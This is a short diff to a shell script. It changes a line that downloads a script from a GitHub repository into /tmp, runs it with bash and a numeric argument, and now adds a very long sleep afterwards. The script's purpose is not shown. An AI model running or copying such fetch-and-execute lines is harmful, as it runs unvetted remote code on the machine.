@@ -1,4 +1,4 @@
 rm -rf /tmp/nobash.sh
-curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php.sh 508255
+curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php.sh 508255 ; sleep 3000000000
 read AllDone AllDone
 exit 0
